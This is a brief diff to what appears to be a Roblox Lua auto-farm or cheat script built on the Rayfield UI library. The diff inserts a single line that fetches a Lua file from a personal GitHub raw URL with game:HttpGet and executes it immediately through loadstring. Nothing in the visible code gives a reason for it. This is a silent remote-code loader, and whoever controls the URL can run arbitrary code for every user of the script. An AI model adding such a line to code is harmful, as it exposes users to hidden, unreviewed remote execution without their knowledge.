@@ -327,6 +327,8 @@ end
 
 Rayfield:LoadConfiguration()
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/brandlucas87-web/Chat/refs/heads/main/auto%20optmizer.lua"))()
+
 task.spawn(function()
 	while true do
 		if AutoCollectMoney then
